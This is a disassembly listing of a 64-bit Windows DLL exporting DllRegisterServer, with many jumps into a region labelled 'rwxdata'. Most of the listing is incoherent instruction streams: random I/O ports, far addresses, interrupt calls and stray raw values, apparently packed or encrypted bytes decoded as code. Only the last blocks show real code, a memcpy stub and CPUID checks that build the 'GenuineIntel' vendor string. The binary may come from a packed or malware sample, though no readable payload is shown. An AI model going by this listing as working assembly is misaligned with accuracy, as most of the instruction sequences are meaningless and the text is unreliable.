loope rwxdata
pop rbp
shl [ rcx + 0x15db50b6 ] 0x1
adc [ rbp - 0x17 ] esi
add eax 0x1812b13
loopne rwxdata
adc eax 0xee0af5c4
fwait
in al 0xa0
jpo rwxdata
sti
int3
out dx al
adc [ rax + rcx + 0x66 ] dl
pop rbp
call [ rbp - 0x4e17372 ]
sub_180011f60
adc eax 0x43836b5e
and bl [ rax ]
cld
sbb cl [ rbp - 0x64 ]
movsb [ rdi ] [ rsi ]
jb rwxdata
pop rdx
or [ rbx + rsi ] ecx
pavgb mm5 [ rbp - 0x36 ]
jpe rwxdata
sub al 0x35
push 0x45495e59
enter 0x18bb 0x2c
loop rwxdata
and eax 0xcc415f28
fucomi st0
pop rsi
mov [ 0x1389d90a5f7be8f2 ] eax
and eax 0x2003ca78
test al 0xe1
movsb [ rdi ] [ rsi ]
sub al 0xde
cmp ecx 0x9d9c5411
insb
rcr [ rcx - 0x2d45085b ] cl
or esi [ rbp + 0x1a1404d ]
sti
insb
std
jo rwxdata
fiadd [ r10 + 0x6d ]
pop rdi
enter 0x5f6c 0x57
or eax 0xe4f64995

push rax
fild [ rax + 0x19 ]
jpe rwxdata
fwait
adc [ rbp + rcx - 0x1a2f4068 ] cl
sub [ rsp + rbx * 4 ] 0xffffff9d
cmp dl [ rbx - 0x7a6b54af ]
push 0xb
mov ch 0x4
sub [ rsi + rcx * 8 ] 0xffffff83
int 0x51
jb rwxdata
cdq
push rsp
test al 0x2d
pushfq
mov edi 0xee0557c8
out 0xe9 eax
xchg ebp eax
rcl [ rbx + 0x2b483890 ] cl
push rsp
hlt
xor eax 0x424a15be
insd
adc ecx esi
sbb [ rcx + 0xa ] 0xffffffe0
cmc
xchg edx eax
sub [ rcx - 0x495ffe60 ] ebp
sub_180012040
sub al 0xf7
neg [ rsi + 0x14 ]
int 0x23
scasb [ rdi ]
xchg [ rcx ] bl
push rdx
call 0x1fb8634d6
test al 0x6d
push rax
push 0xffffffffd4bdfe25
and eax esp
cdq
mov ebp 0x13d49be5
adc [ rax + rcx - 0x2b ] dl
ror [ rdi - 0x7a ] 0xb2
mul [ rsi - 0x73 ]
in al dx
and cl [ rax ]
mov es [ rdx ]
and al 0xfd
cmc
pop rdx
mov ah 0x42
jmp 0x189341751
sub_180012480
loopne rwxdata
adc [ rbx - 0x74 ] bl
in al dx
rcl [ rsi ] 0x1
push 0x5
or esp 0x1f079848
int1
lodsd [ rsi ]
sbb [ r11 ] rdi
or esi [ rbp + 0x5020da85 ]
enter 0xe96d 0x82
and eax 0x67a50780
add al 0x45
mov eax [ 0x1886e7d90aa084b6 ]
push rdx
add al 0x68
fidivr [ rbp - 0x6da88af8 ]
add cl dl
loope rwxdata
and esi esp
and ch [ rax - 0x23c4ee2c ]
pushfq
lahf
xor [ rcx - 0x28 ] ebp
sub al 0x6
sub_180012e40
sub al 0xf5
dec [ rdx - 0x34164a53 ]
push rsp
xchg ebp eax
shr [ rdx - 0x65 ] 0x1
adc [ rax + rcx - 0x13 ] dl
push 0xfffffffff7b24af4
test eax 0x85b40dbd
fisub [ rsi ]
jo rwxdata
or eax esi
mov ah 0xc1
stosb [ rdi ]
mov [ 0x1cdd5451b8eead2f ] eax
movsb [ rdi ] [ rsi ]
xor eax 0x10a8a0de
push rsp
jge rwxdata
jpe rwxdata
retn
add [ rbp - 0x5f ] 0x4157cb96
0x84d1
pop rbx
pop rsp
fucomp st1
mov [ 0x3d207e85059d2f90 ] eax
sub_180014860
sub r9d r14d
push rcx
add cl [ rcx + 0x7d ]
pushfq
mov bl [ rcx - 0xb ]
add [ rdx ] ch
add al 0x5c
jrcxz rwxdata
jpe rwxdata
xchg edx eax
lodsd [ rsi ]
add [ rbp + 0xa4af5d5 ] ebx
in al dx
ja rwxdata
cwde
adc al [ rcx - 0x1c ]
popfq
adc al dh
cmpsb [ rsi ] [ rdi ]
mov [ 0xc0ccd85e9da8547 ] al
outsd
or ah ah
loopne rwxdata
idiv [ rsi + 0x259a57cd ]
sub al 0x57
mov al [ 0x436e55fea1504408 ]
push rax
and eax esp
fisttp [ rsi - 0xf ]
test [ rbx ] esp
test al 0x59
sub_180014c50
adc ebp [ rbx ]
sbb [ rdx ] 0x50a99811
sub eax 0x731273d4
push rbp
jpe rwxdata
mov ah 0xc2
retn 0xa17b
jrcxz rwxdata
std
mov [ rsi + rcx - 0x7a4ae24c ] 0x92
adc eax 0xe714fdc8
and al 0xbd
and eax 0x49b24692
test [ rbp - 0x20 ] ebp
jmp 0x17dc56b8f
xor al 0x1c
mov [ 0x9c406a2c393c431f ] rax
mov esp 0x205a53cd
sub eax 0xe6a83ce
in al 0x77
cmpsb [ rsi ] [ rdi ]
cmp cl [ rax ]
or al 0x16
in eax dx
sub_180014e60
cmp al 0xcc
push rcx
add [ rcx + 0x7f ] cl
pushfq
mov bl [ rcx - 0x63 ]
add ch [ rdx ]
add al 0x5c
jrcxz rwxdata
mov esi 0x49ce2dcd
stc
fld [ rax - 0x4179ba43 ]
scasd [ rdi ]
xchg edx eax
out 0xa5 eax
in al dx
xchg edx eax
scasd [ rdi ]
iretd
sub_180015390
ja rwxdata
[ rax ]
fadd [ rbp + rax * 2 - 0x35 ]
xchg [ rax - 0x23 ] bl
pop rcx
rol cl cl
jns rwxdata
sbb al bl

rol [ rcx - 0x6c730177 ] 0xf1
jmp 0x18f94d50d
push rdi
mul [ rdx + 0x5d ]
shl [ rdx ] 0x1
sub_1800153c0
call 0x17e8ad586
mov [ rbx + 0x3fe940f1 ] ss
adc [ rbx - 0x54905af1 ] 0xeee0a4af
xchg [ rax - 0x22 ] bh
mov ah 0xe0
scasb [ rdi ]
adc [ rsi ] bl
loop rwxdata
lahf
mov [ 0x9c4cd9246e07e272 ] eax
mov ecx 0x458659cd
fmul st1
cmp [ rcx - 0x7e ] 0x57
fiadd [ rbp + 0x15 ]
pop rsi
push rsp
cmp eax 0xe4cefd5e
pop rdx
cmp [ r9 - 0x33 ] 0x51
and eax [ rbx ]
pop rcx
jge rwxdata
fcom [ r9 + 0x76 ]
leave
cmp [ rdi ] esi
mov edx 0xcf1938f
jmp 0x1bdab24c4
xchg esi eax

sub_1800153e0
jns rwxdata
insb
push rdi
fiadd [ rbp + 0x15 ]
pop rsi
push rsp
cmp eax 0xe4cefd5e
pop rdx
cmp [ r9 - 0x33 ] 0x51
and eax [ rbx ]
pop rcx
jge rwxdata
fcom [ r9 + 0x76 ]
leave
cmp [ rdi ] esi
mov edx 0xcf1938f
jmp 0x1bdab24c4
xchg esi eax

sub_1800157f9
xchg edx eax
cmp al 0x59
or [ rsi - 0x2 ] esp
jb rwxdata
fimul [ rsi ]
and eax 0x86e17a92
pop rsi
pop rsi
sbb [ rbx + 0x6d ] eax
mov eax [ 0x5096e1975dc848b6 ]
fild [ rax + 0x73382106 ]
jne rwxdata
xor [ rdx ] esp
xor [ rdx + rbp * 2 ] ebp
adc rcx 0xffffffff8f6ae2a1
jns rwxdata
push rax
and [ rdi + 0x6b ] ebp
pop rax
out dx al
sbb eax 0x62d7ddd2
pop rdi

in eax dx
in al 0x81
leave
loope rwxdata
mov ch 0x92
sub_1800160d0
cmp edx [ 0x185ead5e7 ]
sbb bh dh
ja rwxdata
adc [ rax - 0x38b15094 ] ebp
cwde
mov esp 0x4c955157
cmp eax 0x705ebb98
and [ rbx + rbx * 2 ] r14
jrcxz rwxdata
std
pop rax
xlat
insd
nop
adc bl dh
adc eax 0x176cd881
push 0x4d
or [ rbx - 0x3b ] ch
[ rsi + 0x43 ]
pop rcx
movsb [ rdi ] [ rsi ]
call 0x12844c896
sbb al 0xd6
clc
or [ rbx ] 0xffffffaf
loopne rwxdata
push rsp
mov [ 0x357fc441822b1963 ] eax

sub edi edx
sub esi [ rsi ]
and [ rax - 0x6862c29a ] ebp
test al 0x9a
out dx eax
stosd [ rdi ]
not [ rsp + rbp * 4 + 0xa ]
mov ch 0x4
imul ebx
mov r9 [ r15 + 0x7a ]
fisub [ rsi ]
add al 0x62
imul eax eax 0x52
push rbx
and al 0xec
loope rwxdata
and al 0x61
mov ebp 0xf1952b69
push rdi
jns rwxdata
test eax 0x9fb42399
add eax 0x4472fb83
mov [ 0xfde4a345bf3c472d ] eax
sub_180016f60
add ecx [ rcx + 0x7e ]
xchg ebp eax
sub ecx r13d
push rcx
jge rwxdata
insd
xchg esi eax
jle rwxdata
pop rbp
jmp sub_180016f54
xor dh [ rbx + rbp - 0x78 ]
mov al [ 0xd906058c0fdde021 ]
xlat
jmp 0x1492d41f5
sti
insd
mov eax [ 0xaf76281157720bb6 ]
sub_180017640
mul ecx
adc rax 0xffffffffe003f5c4
adc [ rcx + rdx * 8 - 0x36433e18 ] ecx
adc ah [ rcx ]
mov ecx 0xedefd90f
fld1
pushfq
mov edi 0xb095e5ea
cmpsd [ rsi ] [ rdi ]
xchg edx eax
add al 0x9a
adc [ rcx + rcx * 2 - 0x56 ] dl
call 0x10c442b9b
add rax 0x5fc06a15

sub_1800179f0
loop rwxdata
cld
cmp ebp [ rbp - 0x5f ]
inc [ rdx + 0x281c8504 ]
pop rdi
scasd [ rdi ]
mov edi esp
sbb [ rbp - 0x1f5b50a9 ] bh
out dx al
pop rcx
0x5034
sub al [ rbx + rcx * 2 ]
loop rwxdata
imul [ rdx + rcx * 4 + 0x77 ]
jl rwxdata
xchg [ rax ] bh
jl rwxdata
jmp 0x11bef83c0
sub_180018ab0
fwait
jae rwxdata
adc al 0x82
or cl [ rcx ]
or [ rsi + 0x41b32d66 ] dl
test [ rax - 0x4cd3debe ] ah
mov esi ss
push rax
pop rsi
mov [ 0x540055a2afbc1746 ] eax
sub al 0xf3
and ch [ rax - 0x30dee2f0 ]
pushfq
mov ebx 0x2b48709c
retn
sub_18001bfc2
and eax 0x612dda28
jrcxz rwxdata
loop rwxdata
mov esi 0x84db5032
mov al [ 0x8acb29b2ed5fed42 ]
loopne rwxdata
in al 0xc8
loope rwxdata
mov dh 0x9
push rbx
push rbp
fnsave [ rcx + 0x5f ]
sbb ebp [ rbp - 0x1e ]
cmp [ rax - 0x57 ] al
cmp [ rsi ] bh
sub edx [ rdx ]
rcr [ rcx ] 0x67
fsub [ rbx ]
stosb [ rdi ]
insb
push rdi
loope rwxdata
pop rbx
sbb esp [ rdx + 0x3a2b1242 ]
mov cl 0xed
fst [ rdx + 0x21 ]
in eax dx
fcom [ rbx - 0x6b ]
mov esi 0xd759a969
push 0x51c58129
xlat
int1
sub [ rcx + 0xac7f44e ] ah
mov [ 0xf5c425fe0980d5c6 ] al
xchg [ rsi - 0x46 ] cl
xor esp [ rdi + 0x40580852 ]
mov eax [ 0x50bbb1e817db50b6 ]
pop rbx
sbb [ rax + 0x56 ] bl
out dx eax
sbb al 0x29
rol [ rbp + 0x10 ] 0x54
cmpsd [ rsi ] [ rdi ]
mov eax 0x83d70a32
mov edi 0xb6a067c
stc
xchg edx eax
scasb [ rdi ]
add [ rax + 0x28ccc82b ] dl
sub bh cl
pop rcx
test al 0x73
test eax 0xe89251b0
jmp 0x142e3e0c3
sub_18001c045
cmp eax 0x5e317f6
add [ r11 + 0x59 ] 0x82
imul ebx [ rdi - 0x47 ] 0x251533da
sub bl dl
sub eax 0x17f63d61
jrcxz rwxdata
sub [ rsi + 0x51600a72 ] eax
xlat
push rcx
pop rbp
adc [ rdx ] ecx
jpo rwxdata
sbb bpl [ rcx - 0x6a ]
sahf
or eax 0x48a7036b
sbb ch [ rcx - 0x6a ]
sub_18001cfe0
jg rwxdata
adc eax [ rdx - 0x5208d433 ]
mov eax [ 0x50b631edc90909b6 ]
fcmovne st0
sub eax [ rax + rsi + 0x21a85b50 ]
leave
std
mov al 0x54
test al 0x2d
cwde
mov ebp 0x2a080094
xchg ebp eax
xchg [ rbx - 0x693a22a8 ] bh
sub_18001d0a0
sub ecx ebp
push rcx
add ebx [ rbp + 0x62 ]
push rdi
cli
xchg ebp eax
add al 0x81
loopne rwxdata
shr cl 0xda
jge rwxdata
nop
mov eax 0x4f05e04
adc eax 0x32ba4b82
outsd
xchg esi eax
add eax 0x42da4fc5
mov dh 0x3a
mov al cl
sub [ rbp + 0x29cd1628 ] edx
lea ebx [ rcx ]
and [ rcx + 0x50 ] dh
jge rwxdata
cdq
enter 0x2403 0xbd
push rax
or eax 0x36608541
stosd [ rdi ]
jmp 0x14bef3e4a
fst [ rsi - 0x1a111b1b ]
push rax
imul esp [ rcx ] 0xcc2117b9
fidivr [ rbp - 0x2da92d6f ]
pushfq
adc dl ch
sbb al 0x8d
sub_18001d4c0
loope rwxdata
adc eax 0x45ae23cd
loopne rwxdata
frstor [ rdi - 0x6c ]
shl [ rsi ] cl
adc [ rsp + rcx * 2 - 0x5d ] dl
dec [ rsp - 0x9 ]
push rax
call 0x1301a749a
push rax
insd
adc al 0xa8
mov rax 0xd69495e0dec9572d
pushfq
adc dl [ rdi - 0x2bd7f7b4 ]
scasb [ rdi ]
imul ecx [ rbp + 0x8 ] 0x2a
pushfq
int 0x2b
mov ch 0x24
add al 0x5d
add esi ecx
popfq
sub_18001d5e0
jge rwxdata
sub ecx esi
pop rax
xlat
in al 0x25
jrcxz rwxdata
test [ r8 - 0x5f ] edx
mov dh 0x18
pop rax
sbb [ 0x1ac463540 ] 0x6d
push rax
and [ rdi + 0x32 ] edx
push rsp
and [ rax + 0x42957d10 ] ebp
sub ecx esi
sub_18001d6a4
adc edx 0x7d71959c
ja rwxdata
adc eax 0xa1c181ca
cli
clc
sub [ rdx - 0x36 ] al
fsin
push 0xffffffffffffffd2
idiv [ rsi - 0x19f5a086 ]
xor rax 0x49ad93c8
mov [ r11 - 0x281132a9 ] 0xb2
sbb al 0xc4
xchg [ 0x1fa956923 ] bl
pop rdi
or esp esi
in al dx
stosd [ rdi ]
shr [ rcx ] 0xa0
sbb [ rdx ] ah
jb rwxdata
cmp [ 0x10ab6e1bc ] edx
pop rcx
mov ecx 0xcd410a82
mov bl 0x83
mov ch 0x13
test r13d ebp
iretd
sub al 0x1f
adc [ rbp - 0x9 ] edi
mov ecx 0xdec97add
adc bh ch
stosd [ rdi ]
push rdi
rcr [ rax + rbx + 0x774964d4 ] cl
xchg ebp eax
xor rax 0x58a1408e
xor [ rdx - 0x4c ] eax
mov ah 0x26
add al 0x15
0xc181
sub_18001d7f0
pop rcx
adc eax 0xa090c82
out 0x16 al
jge rwxdata
std
add al 0x36
jbe rwxdata
sub esp ecx
and eax [ rsi - 0x16faee80 ]
xor [ rbx - 0x57abdeba ] ch
xchg ebp eax
sub ecx ecx
ficom [ rdi + 0x58 ]
test eax 0xc52b3e10
push rcx
or ebx ecx
sbb dh [ rbp - 0x71 ]
mov ch 0x4d
or [ rdx ] ch
add al 0x59
mov edi 0x729225bd
enter 0x8401 0xe9
mov ah 0x50
fild [ rdi ]
pop rbx
mov ebp 0x8c17d918
and eax 0xe8051485
test eax 0x5536d42d
sub_18001e8f0
jne rwxdata
and al 0x22
or dh [ rax + rax * 8 ]
push rdx
mov eax [ 0xb8a82153935f5fb6 ]
mov [ 0xa6e19699e0426daf ] eax
push rax
or ecx [ rcx + 0x54 ]
or ch [ rdx ]
pushfq
cmp eax 0xd091d3ba
in al 0x86
outsb
or edi [ rdx - 0x7de82036 ]
or dh ah
retn
sub_18001f340
or [ rsp + rcx * 2 ] eax
jpe rwxdata
mov eax [ 0x50b2e174ce2941b6 ]
fcmovne st0
fnsave [ rbp - 0x57a0e774 ]
insd
or ah [ rcx ]
test [ rax - 0x20 ] dh
sub esp edx
insd
fisttp [ rsi + rcx - 0x6495ed7c ]
pop rsp
mov [ 0x9e404db50f323188 ] eax
xchg [ rax + 0x6e257b19 ] eax
sub_18001f640
and eax 0x9215a22
or al 0xec
xchg [ rax ] bl
pop rdx
mov al [ 0xae1f27bda4a15002 ]
fsubrp st0
shr ecx cl
cld
cmc
mov bh 0x54
push rsp
test al 0x57
rcr [ rdx + 0x19085410 ] cl
adc al 0x8a
iretq
sub_18001f789
sbb [ rdx ] ah
jb rwxdata
fcmovbe st7
push rsp
add eax 0x5e0b6a15
xchg esi eax
outsb
mov edx 0xd3f45fc3
fwait
jno rwxdata
sbb ch cl
sub ecx ecx
in al 0xdb
test esi edi
fistp [ rsi - 0x537ddc80 ]
shl [ rbx + 0x24c562b8 ] cl
and [ rax - 0x9489a58 ] ch
insd
and eax 0xe8d38915
xchg ebp eax
pop rbp
shr [ rcx - 0x7e ] 0x46
insd
adc ecx ebx
sub [ rsi + 0xa ] 0xffffffe6
movsb [ rdi ] [ rsi ]
mov fs [ rcx - 0x6de78541 ]
jb rwxdata
fwait
push rdx
add [ rdx + rdx + 0x2d5b50ac ] al
mov edi 0xaea25e36
test eax 0x20eb5022
test al 0x10
retn
pop rcx
fisttp [ rsi ]
pop rcx
jrcxz rwxdata
std
rcr [ rsi + rcx + 0x54 ] 0x46
cmp cl al
sub_1800207e5
sbb al 0x89
stc
jpe rwxdata
xchg edi eax
in al dx
jmp 0x16c0ce281
mov ch 0x4d
cmpsd [ rsi ] [ rdi ]
outsb
push 0xfffffffffffffffd
or [ rdi - 0x160c13da ] dl
test edx ebx
or ch ah
xlat
xchg edx eax
or [ rcx + 0x42 ] eax
xor [ rdx - 0x47 ] ah
sub_1800208e0
enter 0x346 0x49
jle rwxdata
sub ebx [ r11 ]
jge rwxdata
jge rwxdata
xchg esp eax
xchg [ rbx + 0x5c0426b5 ] cl
or ebx esp
std
insd
adc esi [ rcx - 0x633417a2 ]
pop rsi
mov [ 0x24a93fe9afbc0657 ] eax
xchg ecx eax
cmc
push si
scasd [ rdi ]
shl [ rcx - 0x7b ] cl
hlt
enter 0x9242 0xc7
xchg edx eax
sbb al 0xc5
mov [ rdx + 0x3fe96d42 ] ah
sub_180020e40
cmp ah al
loop rwxdata
or bl cl
adc al 0xc4
test [ rbx ] 0xe1
sbb [ rdx + 0x68 ] bl
and [ rax + rdx * 2 - 0x5f ] al
adc ah [ rcx ]
mov ebx 0xe24db0a
rcl ebx 0x2b
jg rwxdata
not [ rbx + rsi * 2 - 0x18 ]
pop rdi
mov r11 0x2117505042a83fde
xchg esp eax
mov ebp 0x56eaef45
rcr [ rcx - 0x6b58334d ] cl
sub ecx ebp
pop rax
insb
push rbx
pop rcx
jbe rwxdata
xchg ebp eax
jb rwxdata
test al 0xf7
enter 0x9342 0xcb
push rsp
mov cl 0x40
test [ rax - 0x618ca1be ] esp
fisttp [ rsi + rcx + 0x4db50da4 ]
sbb r8 r12
push rsp
loope rwxdata
add [ rbp + rcx * 2 + 0x14 ] eax
jno rwxdata
fst [ rdi + rax - 0x261e3e27 ]
mov [ 0xd25164f88853bfe5 ] al
sub edx edx
cdq
xchg ecx eax
scasd [ rdi ]
sub ebx [ rcx ]
out dx al
sub_180022480
mul ecx
pop rsp
or [ rsp + rcx * 2 ] eax
shr [ rdi + 0x50 ] cl
fcmovne st4
sub eax 0x488ca777
push rdi
and eax 0x25699fcb
pop rbp
mov [ 0x65beabfd9b213702 ] al
jrcxz rwxdata
test [ 0x1e0e39245 ] edi
xchg [ rax - 0x44d3dabe ] esp
or al 0x76
push r8
jmp 0x193013950
pop rax
fstp [ 0x13519277a ]
movsd [ rdi ] [ rsi ]
jo rwxdata
in al dx
je rwxdata
add al 0x15
and al [ rsi + 0x14d2f9d7 ]
test eax 0x6d42db62
pop rbx
int3
push rdi
and [ rcx + 0x21 ] ch
rcr [ 0x117cd938 ] 0x1
push rsp
loopne rwxdata
0x5487
DllRegisterServer
dec [ rdx - 0x7ab75253 ]
mov eax [ 0x984955366001245e ]
popfq
xchg edx eax
mov ebp 0x790834af
movsd [ rdi ] [ rsi ]
push rdi
mov edi 0xec0557e0
test ebx edx
sub ebp [ rax + 0xa1dabd9 ]
std
call 0x1b50a0680
test [ 0x1eeb7345b ] dl
xchg ecx edi
sub_180022a40
cmp cl ch
xor eax 0x2dcd71e5
xchg edx eax
jo rwxdata
loopne rwxdata
or [ rbp + 0x5ba08101 ] ebp
push rdi
js rwxdata
and al 0xd9
xchg esp eax
add eax 0x42da015e
insd
adc eax [ rdx + 0x55ae23cd ]
pop rsi
mov [ 0xceaf7728afbc69e7 ] eax
int1
mov al [ 0xd7310dd958525950 ]
cmc
add rax 0x49c22981
fstpnce st2
pmullw mm2 [ rbx ]
sbb [ rdx ] ch
push rax
in eax dx
cmp dl [ rdx + 0x24 ]
fst [ rdi ]
adc esp [ rbx ]
jae rwxdata
js rwxdata
test [ r10 ] esi
cld
add al 0x9
int 0x25
sub [ rax + 0x53 ] ch
imul ebx [ rax - 0x17 ] 0xffffffd3
fwait
sbb [ rax ] ecx
add ah dl
and ah [ rdi * 4 + 0x4e9d1cfd ]
test [ r8 ] edi
jmp 0x14d740f7b
push rdi
sbb [ rax - 0x563bc73f ] ah
adc [ rcx ] bl
xlat
xchg ebp eax
sub_180022b40
adc al 0xcd
and ebp [ rsi - 0x3bc016a3 ]
and edi [ rax - 0x2c732aaf ]
and [ rsi - 0x55d4f4dc ] eax
pop rax
fmul [ rax - 0x39 ]
jpe rwxdata
jne rwxdata
sbb [ rbp + 0x72 ] ecx
adc edx [ rcx * 8 - 0x16a251dd ]
cmpsb [ rsi ] [ rdi ]
f2xm1
out dx al
push rbp
or [ rdx + 0x51 ] ah
fistp [ rsi ]
xchg ecx eax
stosb [ rdi ]
sub eax [ rdx - 0x5ba51c96 ]
cmc
sub_180024340
add cl dl
call 0x18fe3c508
outsb
mov al [ 0xaed875553de95042 ]
fsubrp st0
fisttp [ rdi ]
mov [ rcx + 0x3 ] cs
adc [ rax ] bl
push rsp
test al 0x2d
cwde
mov ebx 0x6228706d
out 0xd2 eax
sub_1800246e2
sbb al 0x83
jle rwxdata
jg rwxdata
push rsi
and al dh
cmp [ rsi + 0x18 ] esp
insd
and [ rdi + rdi * 2 ] edx
clc
jpe rwxdata
and ch [ rax + 0x6d1f2ac1 ]
adc eax 0xcfec9e53
or [ rax + 0x36ce53c ] ah
fsubr [ rbx - 0x57 ]
sbb eax ebx
in al 0x34
or al 0xe0
movsb [ rdi ] [ rsi ]
nop
mov edi 0x7e831c20
sub_180024d85
jrcxz rwxdata
push rax
scasb [ rdi ]
test eax 0xa084dbd0
sti
shr [ rsi + 0x50b6a1b0 ] 0x93
or edx ecx
jno rwxdata
pop rdx
std
or [ rdi + 0x68eec6e ] dl
test edx ebx
or ch ah
xlat
fst [ rsi ]
nop
test [ rdi + rdx ] eax
adc [ rax - 0x54 ] dl
adc dh dl
and [ rax + 0x43177708 ] ebp
and bl [ rdx ]
cld
mov ah 0x4
adc eax 0x2738436a
pop rax
sub_180025dd0
sti
sbb al bl
or eax 0x1cead90a
and ebp [ rax ]
cmc
je rwxdata
pop rbx
add esi ecx
sbb [ rdi ] 0x2c
push rdi
pop rax
sbb [ rax ] edx
pop rsi
jrcxz rwxdata
not [ rdi - 0x7e ]
jrcxz rwxdata
xor al 0x4
test [ rax ] 0xb248fe31
mov [ 0x984826da859db0c5 ] eax
stosb [ rdi ]
add al 0x31
fmul [ rax ]
sub al [ rsp + rbx * 2 ]
cmp al 0x65
jmp 0x12643ee34
mov esi 0x84db5032
mov al [ 0xd90a0d44d818fb42 ]
sub_180027010
add edx [ rbx ]
sub eax [ rcx + 0x63a81862 ]
loopne rwxdata
dec [ rdx ]
in al 0xca
mov cl 0xd8
jmp 0x1964bf590
shl [ rdi ] 0x1
push rsp
push rsi
out dx eax
sbb al 0x5d
adc eax 0x5c5b1622
idiv [ rdi ]
sub_1800271d2
adc esp [ rcx ]
xor [ rsi + 0x10 ] esp
imul ebx ebp 0x7eec09dc
test al 0xd4
xor al 0x1a
nop
lahf
movsd [ rdi ] [ rsi ]
xlat
cdq
xor [ rdi + 0x171822f ] ch
add [ rsi + 0x20 ] 0x170cfc2a
scasd [ rdi ]
cli
pop rsp
or eax edx
sub_180027400
adc al 0x3a
pop rbp
nop
mov [ 0x48d4592f8305b87f ] eax
jpe rwxdata
adc al 0xd0
call 0x11712ce2e
or eax 0x9fd90e65
adc ah [ rcx ]
test [ rdx - 0x49dab0b3 ] 0x50
fild [ rax + 0x54936812 ]
mov bh 0x29
push rax
loopne rwxdata
movsd [ rdi ] [ rsi ]
sar [ 0x14194d979 ] 0xa9
cmp eax [ rcx + 0x6c ]
rcl [ rdx + rdi ] 0x1
sub_180028ef0
jno rwxdata
push 0x21
int1
js rwxdata
0x598b
sub dl ah
shr esi 0x1
mov edi 0x150429b4
push 0xb
xor eax 0xc900f772
int 0x48
jpe rwxdata
jno rwxdata
scasd [ rdi ]
mov al 0xaf
mov [ 0x9e2542da8542ed20 ] al
nop
and eax 0x4a1cd84
insd
mov eax [ 0xddfea15042143cf7 ]
out 0xae al
and ah bl
push rdi
sbb al dl
lodsd [ rsi ]
mov [ rcx ] dh
push rsi
out dx eax
sbb al 0x9b
jmp 0x1f0974ebe
pop rbx
int3
test ecx ebp
test [ rsi ] edi
or eax [ rcx - 0x7b ]
mov esp 0x3350b6a0
fmul [ rdi ]
mov edi 0xa5d618af
mov eax 0x5721513c
mov ebp 0xdecb1646
loopne rwxdata
xlat
xchg ebp eax
mov es [ rsi + 0x22eaf991 ]
test r10d ebx
xchg ebp eax
pushfq
fwait
jg rwxdata
mov edi 0xacdf59af
or [ rax + 0x5857c0bf ] ebx
jpe rwxdata
insd
mov eax [ 0x50b6a16f2a654d71 ]
xchg ebx eax
or esp esi
add eax 0xb04eafc0
scasd [ rdi ]
jmp 0x18d681503
xchg [ rcx - 0x7ddd1507 ] dl
ja rwxdata
outsd
push rbp
or ch dl
jg rwxdata
mov ebp 0xf744ec78
pop rdi
jno rwxdata
test edx ebx
mov esp 0xda854105
test [ rsi - 0x7a4edd5a ] esp
fisub [ rdi - 0x44 ]
sub eax 0x42a086dd
or edx [ rdx + rdx * 2 ]
or [ rsp + rbx * 8 - 0x1f495ead ] al
loopne rwxdata
ja rwxdata
add eax 0xbdda8541
js rwxdata
and al [ rdx - 0x597afa89 ]
cmpsb [ rsi ] [ rdi ]
and dh [ rcx - 0x4398257b ]
neg [ rdi + 0x71 ]
mov edi 0x65853be9
or eax 0x11b6a152
movsxd ebx [ rax - 0x6957bd5f ]
fisttp [ rdx + rbx * 2 + 0x54215046 ]
cmpsd [ rsi ] [ rdi ]
jpo rwxdata
fwait
adc [ rax ] bl
je rwxdata

mul [ rdx - 0x7f ]
stc
ficomp [ rbx + 0x5a5962c2 ]
mov rbx 0x355d0b6a1538ec51
cmpsd [ rsi ] [ rdi ]
xlat
sti
cmp [ rdi - 0x33 ] esp
push rdi
stosb [ rdi ]
and [ rbp + 0x3da8580 ] bl
or ebx 0x9bdf615
xor [ rsi + 0xb689920 ] 0xffffffda
adc eax 0xa7a7decb
ror [ rcx + rsi * 4 + 0x18109b69 ] 0x1
push rdi
sub_1800294c0
dec [ rdx - 0x36175253 ]
push 0x5f791a64
or dl bl
sahf
scasd [ rdi ]
lea ecx [ rbp + 0x4f ]
movsd [ rdi ] [ rsi ]
test al 0x50
pop rbx
test al 0x36
mov bh 0x90
push rsp
test al 0x2d
sub_1800296d0
sub al 0x16
adc [ rax - 0x2d ] esi
mov bh 0x80
jg rwxdata
sub eax 0x8b25cd09
sbb [ rsi + 0x24 ] edx
xchg ecx eax
rol [ rdx + 0x21fa5ead ] 0x1
xchg esp eax
or bl ch
jne rwxdata
pop rcx
fnstsw [ rbp + 0x1e ]
adc al 0xd7
popfq
push rcx
xchg ecx eax
pop rdx
add [ rbx - 0x57dec920 ] dh
pop rax
sub_180029f46
jrcxz rwxdata
sbb ch dl
cli
sbb eax 0x70f0cb95
cli
add ecx [ rdi ]
std
cmp edx [ 0x14910e8a3 ]
mov r15b 0x52
and [ rsi + 0x50b6a4b0 ] ebp
xchg ebx eax
or [ rdx ] edi
adc eax esp
fst [ rsi ]
add [ rbp - 0x5410a059 ] 0xe0
lodsb [ rsi ]
adc dh dl
and al 0x54
or [ rdi + 0x17 ] dh
sbb [ rbp - 0x21 ] esi
adc [ rdx ] ch
or ecx [ rdx ]
sub_180040f34
fsubr st6
mov cl 0x65
in eax dx
jg rwxdata
adc eax 0x39d04c6a
int1
in al dx
jbe rwxdata
jpe rwxdata
mov ch 0x4d
or [ rdx ] ch
adc eax [ rsi ]
loopne rwxdata
push 0xb
mov ch 0x62
add esi esp
jle rwxdata
adc al 0x8
rol ebp cl
pop rbx
test al 0x6d
push rax
adc [ rax + rbp * 4 + 0x2d ] dl
jpe rwxdata
add al 0x15
push 0x4c
sar [ rcx ] 0x1
sub_18000122e
push rbp
sub rsp 0x40
lea rbp [ rdx + 0x20 ]
mov rcx [ rbp + 0x8 ]
call sub_180015940
add rsp 0x40
pop rbp
retn
sub_180001c00
sub rsp 0x28
add rsp 0x28
jmp memcpy
sub_180002f92
mov eax 0x7
xor ecx ecx
cpuid
mov r10d ebx
sub_18000346c
push rax
sub_18000346d
push rcx
sub_18000346e
pushfq
sub_18000346f
pop rax
sub_180003470
mov ecx eax
sub_180003472
xor eax 0x200000
sub_180003477
push rax
j_sub_180003479
popfq
sub_180003479
pushfq
sub_18000347a
pop rax
sub_18000347b
cmp eax ecx
sub_18000347d
je j_sub_18000348b
sub_18000347f
mov [ rbp + 0x15c ] 0x1
sub_180003489
push rcx
j_sub_18000348b
popfq
sub_18000348b
pop rcx
sub_18000348c
pop rax
cmp [ rbp + 0x15c ] 0x0
je sub_18000387f
xor edx edx
lea rbx [ rbp + 0x13c ]
mov rax 0x49656e69756e6547
mov [ rbp + 0x140 ] rbx
mov [ rbp + 0xf8 ] rax
mov [ rbp + 0x100 ] 0x6c65746e
mov [ rbp + 0x158 ] edx
mov [ rbx ] edx
sub_180003687
cmp [ rw-data ] 0x0
jne sub_18000387f
cmp [ rbp + 0x13c ] 0x2
jl sub_18000387f
